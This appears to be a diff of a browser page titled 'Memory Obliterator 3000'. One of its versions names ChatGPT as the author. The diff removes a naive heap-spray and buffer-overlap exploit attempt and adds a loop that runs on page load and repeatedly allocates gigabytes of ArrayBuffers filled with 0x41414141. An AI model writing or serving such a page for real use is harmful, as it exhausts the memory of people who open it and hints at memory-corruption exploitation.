@@ -1,48 +1,68 @@
 <!DOCTYPE html>
 <html>
-<head><title>chatgpt made this beautiful memory fucker 3000 for me :3</title></head>
+<head><title>Memory Obliterator 3000</title></head>
 <body>
   <h1>cromos bingbang: Touching memory it shouldn’t 😎</h1>
+
+  <div>
+    <label><input type="radio" name="target" value="4" checked> 4 GB</label>
+    <label><input type="radio" name="target" value="8"> 8 GB</label>
+    <label><input type="radio" name="target" value="16"> 16 GB</label>
+  </div>
+
+  <p id="status">Allocated: 0 MB</p>
+
   <script>
     const buffers = [];
-    const NUM = 0x2000;
-    const SIZE = 0x40000;
+    const SIZE = 0x40000; // 256 KB per buffer approx
+    const NUM = 0x2000;   // buffers per cycle (adjust if needed)
 
-    // Heap spray with controlled pattern
-    for (let i = 0; i < NUM; i++) {
-      const ab = new ArrayBuffer(SIZE);
-      const view = new DataView(ab);
-      for (let j = 0; j < SIZE; j += 4) {
-        view.setUint32(j, 0x41414141, true); // Controlled pattern
+    function getSelectedTargetGB() {
+      const radios = document.querySelectorAll('input[name="target"]');
+      for (const r of radios) {
+        if (r.checked) return parseInt(r.value);
       }
-      buffers.push(ab);
+      return 4; // fallback
     }
 
-    // Backing store overlap attempt
-    for (let i = 0; i < 10000; i++) {
-      const buf1 = new ArrayBuffer(0x1000);
-      const buf2 = new ArrayBuffer(0x1000);
-      let view1 = new Uint32Array(buf1);
-      let view2 = new Uint32Array(buf2);
+    function sprayMemory(targetBytes) {
+      let allocatedBytes = 0;
 
-      view1[0] = 0x13371337;
-      view2[0] = 0xDEADC0DE;
+      for (let i = 0; i < NUM; i++) {
+        if (allocatedBytes >= targetBytes) break;
 
-      // Realloc + GC trigger
-      view1 = null;
-      view2 = null;
-      if (typeof gc === 'function') gc();
+        const ab = new ArrayBuffer(SIZE);
+        const view = new DataView(ab);
+        for (let j = 0; j < SIZE; j += 4) {
+          view.setUint32(j, 0x41414141, true);
+        }
+        buffers.push(ab);
+        allocatedBytes += SIZE;
+      }
+      return allocatedBytes;
     }
 
-    // WASM test
-    const wasmCode = new Uint8Array([
-      0x00, 0x61, 0x73, 0x6d, // WASM magic
-      0x01, 0x00, 0x00, 0x00, // WASM version
-      // Add functions here later
-    ]);
-    WebAssembly.instantiate(wasmCode).catch(e => {
-      console.log("WASM crash? 🔥", e);
-    });
+    function clearBuffers() {
+      buffers.length = 0;
+      if (typeof gc === 'function') gc(); // manual GC trigger if exposed
+    }
+
+    function loop() {
+      const targetGB = getSelectedTargetGB();
+      const targetBytes = targetGB * 1024 * 1024 * 1024;
+
+      const allocatedBytes = sprayMemory(targetBytes);
+      document.getElementById('status').textContent = `Allocated: ${(allocatedBytes / (1024*1024)).toFixed(2)} MB`;
+
+      // After spraying target memory, reset buffers and do it again
+      setTimeout(() => {
+        clearBuffers();
+        document.getElementById('status').textContent += ' — Resetting buffers and looping...';
+        setTimeout(loop, 100); // small delay before next spray
+      }, 1000); // wait 1s before reset to give memory time to settle
+    }
+
+    loop();
   </script>
 </body>
 </html>
